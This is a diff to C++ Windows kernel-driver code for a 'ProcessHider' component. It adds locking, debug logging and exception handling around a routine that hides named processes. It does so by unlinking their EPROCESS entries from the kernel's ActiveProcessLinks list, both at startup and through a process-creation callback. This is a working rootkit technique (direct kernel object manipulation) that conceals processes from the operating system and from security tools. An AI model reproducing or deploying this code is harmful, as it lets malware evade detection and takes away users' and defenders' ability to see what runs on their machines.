@@ -15,6 +15,8 @@ namespace filter
 
 		KeInitializeGuardedMutex(&process_lock_);
 
+		KeInitializeGuardedMutex(&process_name_lock_);
+
 		ProcessHider::HideOnInitializeOperation();
 
 		NTSTATUS status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, FALSE);
@@ -63,7 +65,15 @@ namespace filter
 
 	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
 	{
-		return ulti::CheckEqualString(process_name, process_to_hide_);
+		bool ret_val = true;
+		
+		KeAcquireGuardedMutex(&process_name_lock_);
+
+		ret_val = ulti::CheckEqualString(process_name, process_to_hide_);
+		
+		KeReleaseGuardedMutex(&process_name_lock_);
+		
+		return ret_val;
 	}
 
 	void ProcessHider::HideOnInitializeOperation()
@@ -83,6 +93,8 @@ namespace filter
 
 		while (true)
 		{
+			bool ret_val = false;
+
 			HANDLE cur_pid = cur_p_eprocess->UniqueProcesId;
 
 			last_pid = (long long)cur_pid;
@@ -95,7 +107,11 @@ namespace filter
 				{
 					if (HideProcess(cur_p_eprocess) == true)
 					{
-						// DebugMessage("Hide process with PID %d and name %S", (int)cur_pid, process_name);
+						DebugMessage("Hide process with PID %d and name %S", (int)cur_pid, process_name);
+					}
+					else
+					{
+						DebugMessage("Can not hide process with PID %d and name %S", (int)cur_pid, process_name);
 					}
 				}
 			}
@@ -105,6 +121,7 @@ namespace filter
 			{
 				break;
 			}
+
 		}
 	}
 
@@ -130,7 +147,11 @@ namespace filter
 
 				if (status == true)
 				{
-					// DebugMessage("Hide process on created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);
+					DebugMessage("Hide process on created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);
+				}
+				else
+				{
+					DebugMessage("Can not hide process on created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);
 				}
 			}
 		}
@@ -139,27 +160,34 @@ namespace filter
 
 	bool ProcessHider::HideProcess(P_CUSTOM_EPROCESS peprocess)
 	{
-
+		bool ret_val = true;
 		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
 		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;
 
 		KeAcquireGuardedMutex(&process_lock_);
 
-		cur_p_eprocess = peprocess;
+		__try
+		{
+			cur_p_eprocess = peprocess;
 
-		pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
-		next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
-		pre_p_eprocess = CONTAINING_RECORD(pre_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
-		next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
-		pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
-		next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
+			pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
+			next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
+			pre_p_eprocess = CONTAINING_RECORD(pre_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
+			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
+			pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
+			next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
 		
-		cur_p_eprocess->ActiveProcessLinks.Blink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
-		cur_p_eprocess->ActiveProcessLinks.Flink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
+			cur_p_eprocess->ActiveProcessLinks.Blink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
+			cur_p_eprocess->ActiveProcessLinks.Flink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
+		}
+		__except(EXCEPTION_EXECUTE_HANDLER)
+		{
+			ret_val = false;
+		}
 
 		KeReleaseGuardedMutex(&process_lock_);
 
-		return true;
+		return ret_val;
 	}
 
 }
